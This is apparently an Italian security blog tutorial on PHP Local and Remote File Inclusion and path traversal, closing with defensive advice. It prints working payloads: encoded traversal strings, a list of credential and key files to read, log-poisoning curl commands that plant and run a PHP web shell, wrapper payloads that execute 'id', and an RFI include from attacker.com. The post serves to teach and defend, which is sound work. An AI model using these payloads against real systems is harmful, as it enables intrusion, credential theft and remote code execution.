---
layout: post
title: "File Inclusion: LFI, RFI e Path Traversal — da lettura file a RCE"
date: 2026-06-04
cat: red
tags: [LFI, RFI, path traversal, PHP, RCE, OWASP, web]
excerpt: "Local File Inclusion e Remote File Inclusion sono vulnerabilità PHP che permettono di leggere file arbitrari e, in scenari favorevoli, ottenere code execution. Teoria, sfruttamento e difesa."
---

Le vulnerabilità di File Inclusion nascono quando un'applicazione include file dinamicamente basandosi su input non validato dell'utente. Classificate nell'OWASP Top 10, possono portare da semplice disclosure di file a Remote Code Execution.

## Local File Inclusion (LFI)

```php
// Codice vulnerabile
$page = $_GET['page'];
include($page . '.php');
```

Richiesta normale: `?page=home` → include `home.php`  
Richiesta malevola: `?page=../../../etc/passwd` → legge `/etc/passwd`

### Path Traversal

La navigazione nelle directory usando `../` per uscire dalla webroot:

```
?page=../../../etc/passwd
?page=....//....//....//etc/passwd    # bypass filtri semplici
?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd  # URL encoding
?page=..%252f..%252fetc%252fpasswd    # double encoding
```

### File interessanti da leggere

```
/etc/passwd                     # utenti di sistema
/etc/shadow                     # hash password (richiede root)
/proc/self/environ              # variabili d'ambiente del processo
/proc/self/cmdline              # comando del processo corrente
/var/log/apache2/access.log     # log Apache — utile per log poisoning
/var/www/html/config.php        # credenziali database
/home/user/.ssh/id_rsa          # chiave SSH privata
```

### LFI → RCE: Log Poisoning

Se si riesce a leggere i log del server web, si può prima iniettare codice PHP nel log tramite User-Agent, poi includerlo:

```bash
# Step 1: inietta PHP nel log tramite User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Step 2: include il log con LFI
curl "http://target.com/?page=../../../var/log/apache2/access.log&cmd=id"
```

### LFI con PHP Wrappers

PHP ha wrapper interni che permettono di bypassare l'estensione aggiunta dal codice:

```
# Legge il file sorgente PHP in base64 (bypass dell'esecuzione)
?page=php://filter/convert.base64-encode/resource=config.php

# Esegue codice PHP passato in input
?page=php://input
# POST body: <?php system('id'); ?>

# data:// wrapper
?page=data://text/plain,<?php system('id');?>
```

## Remote File Inclusion (RFI)

Se `allow_url_include` è abilitato in PHP, è possibile includere file remoti:

```
?page=http://attacker.com/shell.txt

# shell.txt contiene: <?php system($_GET['cmd']); ?>
```

RFI è più rara oggi (PHP disabilita `allow_url_include` di default), ma ancora presente in applicazioni legacy.

## Difesa

- **Usa una whitelist** di file includibili, mai variabili libere
- Disabilita `allow_url_include` e `allow_url_fopen` in `php.ini`
- Usa percorsi assoluti con `realpath()` e verifica che il file risultante sia dentro la directory attesa
- Implementa un WAF con regole per path traversal
- Limita i permessi del processo web server (non root)
